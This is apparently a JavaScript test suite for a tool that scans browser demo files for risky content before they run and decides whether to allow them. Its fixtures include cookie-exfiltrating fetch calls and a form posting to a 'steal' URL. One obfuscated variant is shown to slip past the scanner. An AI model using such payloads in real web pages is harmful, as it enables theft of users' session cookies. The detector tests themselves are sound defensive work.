import assert from 'node:assert/strict';

import { checkDemoContent, decideRun, describeContentReport } from '../browser/checkDemoContent.js';

describe('checkDemoContent: what a demo does, before it runs', () => {
  it('passes a demo that only uses the shim layer', () => {
    const report = checkDemoContent({
      'demo.js': `import { readFileSync, writeFileSync } from 'fs';
writeFileSync('/out.txt', readFileSync('/in.txt', 'utf8').toUpperCase());
console.log('done');
`,
    });
    assert.equal(report.ok, true);
    assert.equal(report.checked, 1);
    assert.deepEqual(report.findings, []);
    assert.equal(describeContentReport(report), 'content check: 1 file(s), nothing to review');
  });

  it('reports a network call with its file and line', () => {
    const report = checkDemoContent({
      'demo.js': `const first = 1;
fetch('https://example.com/?stolen=' + document.cookie);
`,
    });
    const rules = report.findings.map(finding => finding.rule);
    assert.equal(report.ok, false);
    assert.ok(rules.includes('network-fetch'));
    assert.ok(rules.includes('cookie-read'));
    const fetchFinding = report.findings.find(finding => finding.rule === 'network-fetch');
    assert.equal(fetchFinding.file, 'demo.js');
    assert.equal(fetchFinding.line, 2);
    assert.equal(fetchFinding.severity, 'blocked-by-policy');
  });

  it('reports the things no policy covers as needing review', () => {
    const report = checkDemoContent({
      'index.html': `<script src="https://cdn.example.com/x.js"></script>
<form action="https://example.com/steal"><input name="c"></form>
`,
      'main.js': "window.open('https://example.com');\nlocation.href = 'https://example.com';\n",
    });
    const review = report.findings.filter(finding => finding.severity === 'needs-review');
    const rules = review.map(finding => finding.rule).sort();
    assert.deepEqual(rules, ['external-script', 'form-action', 'navigation', 'popup']);
    assert.match(describeContentReport(report), /5 blocked-by-policy|needs-review/);
  });

  it('accepts files in both shapes, and counts only what it inspected', () => {
    const report = checkDemoContent({
      'a.js': { content: 'const a = 1;\n' },
      'b.js': 'const b = 2;\n',
      'c.css': { content: 'body { color: red }' },
    });
    assert.equal(report.checked, 3);
    assert.equal(report.ok, true);
  });

  it('is honest about not being a boundary: an obfuscated call is not caught', () => {
    // This asserts the limit on purpose. A pattern list is defence-in-depth and review evidence, not a
    // control — "do NOT treat it as a security boundary" is the repo's own wording for the same-origin
    // sanitizer. The boundary is the second origin; this check is what makes the weaker deployment reviewable.
    const report = checkDemoContent({
      'demo.js': `const name = 'fe' + 'tch';
const fn = globalThis[name];
fn('https://example.com/?x=' + document['coo' + 'kie']);
`,
    });
    assert.equal(report.ok, true);
    assert.deepEqual(report.findings, []);
  });

  it('does not choke on odd input', () => {
    assert.equal(checkDemoContent({}).ok, true);
    assert.equal(checkDemoContent({}).checked, 0);
    assert.equal(checkDemoContent({ 'x.js': {} }).checked, 0);
    assert.equal(checkDemoContent(undefined).ok, true);
  });
});

describe('decideRun: the posture decides whether findings are information or a gate', () => {
  const clean = checkDemoContent({ 'demo.js': 'const a = 1;\n' });
  const dirty = checkDemoContent({ 'demo.js': "fetch('https://example.com/?c=' + document.cookie);\n" });

  it('lets a clean demo run in either posture', () => {
    assert.equal(decideRun({ report: clean, sameOriginSandbox: false }).allow, true);
    assert.equal(decideRun({ report: clean, sameOriginSandbox: true }).allow, true);
  });

  it('reports findings as information when the sandbox has its own origin', () => {
    const decision = decideRun({ report: dirty, sameOriginSandbox: false });
    assert.equal(decision.allow, true);
    assert.match(decision.reason, /the browser is the boundary/);
    assert.match(decision.reason, /2 finding\(s\) for review/);
  });

  it('blocks on findings when the sandbox is on this origin by opt-in', () => {
    const decision = decideRun({ report: dirty, sameOriginSandbox: true });
    assert.equal(decision.allow, false);
    assert.match(decision.reason, /same-origin opt-in/);
    assert.match(decision.reason, /demo\.js:1 network-fetch/);
  });

  it('takes the posture as given, never inferred', () => {
    // The point of the flag: the same report and the same files decide differently only because the posture was
    // configured. Nothing about a url or a hostname is consulted here.
    assert.notEqual(
      decideRun({ report: dirty, sameOriginSandbox: true }).allow,
      decideRun({ report: dirty, sameOriginSandbox: false }).allow,
    );
  });
});
